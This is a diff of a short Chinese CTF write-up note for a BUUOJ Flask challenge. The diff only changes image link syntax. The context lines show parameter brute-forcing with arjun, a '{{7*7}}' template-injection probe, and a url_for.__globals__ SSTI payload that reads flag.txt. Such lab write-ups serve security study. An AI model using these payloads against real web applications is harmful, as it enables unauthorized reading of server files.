@@ -1,8 +1,8 @@
-![[Pasted image 20230118100150.png|500]]
+![](<./img/Pasted image 20230118100150.png>)
 
 ---
 
-![[Pasted image 20230118100135.png|1000]]
+![](<./img/Pasted image 20230118100135.png>)
 
 突出一个爆破.jpg
 
@@ -14,19 +14,19 @@
 arjun -u http://xxx.node4.buuoj.cn:81/ -c 100 -d 0.1
 ```
 
-![[Pasted image 20230118103413.png|1000]]
+![](<./img/Pasted image 20230118103413.png>)
 
 ```
 /?name=1
 ```
 
-![[Pasted image 20230118103529.png|200]]
+![](<./img/Pasted image 20230118103529.png>)
 
 ```
 /?name={{7*7}}
 ```
 
-![[Pasted image 20230118103559.png|200]]
+![](<./img/Pasted image 20230118103559.png>)
 
 利用`url_for`函数注入
 
@@ -42,6 +42,6 @@ arjun -u http://xxx.node4.buuoj.cn:81/ -c 100 -d 0.1
 /?name={{url_for.__globals__['__builtins__']['open']('flag.txt').read()}}
 ```
 
-![[Pasted image 20230118104246.png|500]]
+![](<./img/Pasted image 20230118104246.png>)
 
 #Web #python #flask #SSTI #urlfor #arjun #参数爆破
